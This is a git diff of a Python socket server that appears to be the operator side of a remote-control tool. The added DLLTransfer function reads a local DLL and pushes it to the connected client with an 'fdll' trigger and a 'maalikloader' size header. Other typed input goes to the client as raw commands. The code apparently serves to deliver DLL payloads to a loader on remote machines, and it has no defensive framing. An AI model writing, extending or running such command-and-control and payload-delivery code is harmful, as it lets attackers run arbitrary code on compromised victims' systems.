@@ -2,6 +2,11 @@ import socket
 import _thread
 import sys
 import time
+from colorama import Fore, Style
+import colorama
+import os
+
+colorama.init()
 
 log = []
 
@@ -27,20 +32,41 @@ def _wait_for_msg():
 def main():
 
     def message(sock):
+
+        def send(m):
+            sock.send(m.encode())
+
+        def sendb(m):
+            sock.send(m)
+
+        def DLLTransfer(mfile=None):
+            if(mfile == None):
+                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
+            
+            try:
+                with open(mfile, "rb") as sendfile:
+                    data = sendfile.read()
+                    bufferst = os.stat(mfile)
+                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
+                    
+                    send("fdll") # Send File Receive trigger for client
+                    trigger = "maalikloader" + ":" + str(bufferst.st_size) 
+                    time.sleep(1)
+                    send(trigger) # Send Trigger
+                    sendb(data) # Send file
+                    print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
+                    _wait_for_msg()
+            except FileNotFoundError:
+                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
+            except Exception as e:
+                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
         while(True):
             data = input("--> ")
             # if(len(data) > 0):
-            if(data == "frecv"):
-                filename = input("file > ")
-                content = input("file content > ")
-                client.send("frecv".encode())
-                x = filename + ":" + str(len(content))
-                client.send(x.encode())
-                time.sleep(1)
-                client.send(content.encode())
-                print("[ File : " + filename + " , Trigger : " + x)
+            if(data == "fdll"):
+                DLLTransfer()
             else:
-                client.send(data.encode())
+                send(data)
                 #_wait_for_msg()
             
 
